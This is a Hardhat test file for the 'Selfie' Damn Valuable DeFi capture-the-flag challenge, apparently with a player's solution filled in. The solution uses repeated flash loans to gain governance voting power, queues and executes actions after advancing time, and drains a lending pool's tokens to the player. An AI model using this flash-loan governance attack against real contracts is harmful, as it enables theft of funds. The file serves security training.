const { ethers } = require('hardhat');
const { expect } = require('chai');
const { time } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Selfie', function () {
    let deployer, player;
    let token, governance, pool;

    const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
    const TOKENS_IN_POOL = 1500000n * 10n ** 18n;
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        // Deploy Damn Valuable Token Snapshot
        token = await (await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer)).deploy(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = await (await ethers.getContractFactory('SimpleGovernance', deployer)).deploy(token.address);
        expect(await governance.getActionCounter()).to.eq(1);

        // Deploy the pool
        pool = await (await ethers.getContractFactory('SelfiePool', deployer)).deploy(
            token.address,
            governance.address    
        );
        expect(await pool.token()).to.eq(token.address);
        expect(await pool.governance()).to.eq(governance.address);
        
        // Fund the pool
        await token.transfer(pool.address, TOKENS_IN_POOL);
        await token.snapshot();
        expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
        expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
        expect(await pool.flashFee(token.address, 0)).to.eq(0);

    });

    async function increaseBlockTime(timeInSeconds) {
        //Increase the block time plus two days
        // Get the current block number
        const currentBlockNumber = await ethers.provider.getBlockNumber();
        console.log("CurrentBlockNumber:", currentBlockNumber);

        await ethers.provider.send("evm_increaseTime", [timeInSeconds]);

        // Mine a new block to update the block timestamp
        await ethers.provider.send("evm_mine", []);

        // Get the new block number and timestamp
        const newBlockNumber = await ethers.provider.getBlockNumber();
        const newBlockTimestamp = (await ethers.provider.getBlock(newBlockNumber)).timestamp;

        console.log("Increased Block Number:", newBlockNumber);
        console.log("Increased Block Timestamp:", newBlockTimestamp);
    }
    it.only('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // Deploy the borrower
        let borrower = await (await ethers.getContractFactory('FlashBorrower', deployer)).deploy(
            pool.address,
            governance.address,
            token.address    
        );
        console.log("FlashBorrower deployed");
        const maxReq = (await token.getTotalSupplyAtLastSnapshot()).div(2).add(1);
        console.log("maxReq: ", maxReq);
        let balOfBorrower = await token.balanceOf(borrower.address);
        console.log("balOfBorrower: ", balOfBorrower);
        while(balOfBorrower.lt(maxReq)) {
            let amount = maxReq.sub(balOfBorrower);
            console.log("Amount Borrowing", amount);
         
            //queue action
            await borrower.flashBorrow(token.address, amount);
            console.log("Queued...");

            // Increase the block time by 2 days (in seconds)
            const twoDaysInSeconds = 2 * 24 * 60 * 60;
            await increaseBlockTime(twoDaysInSeconds);            

            //execute action
            await borrower.flashBorrow(token.address, amount);
            console.log("Executed...");
            balOfBorrower = await token.balanceOf(borrower.address);
            console.log("balOfBorrower: ", balOfBorrower);
        }
        console.log("Draining remaining balance........................");
        await borrower.drainRemainingToken();
         // Increase the block time by 2 days (in seconds)
        const twoDaysInSeconds = 2 * 24 * 60 * 60;
        await increaseBlockTime(twoDaysInSeconds); 
        await borrower.drainRemainingToken();
        await borrower.transferBalance(player.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await token.balanceOf(pool.address)
        ).to.be.equal(0);
    });
});
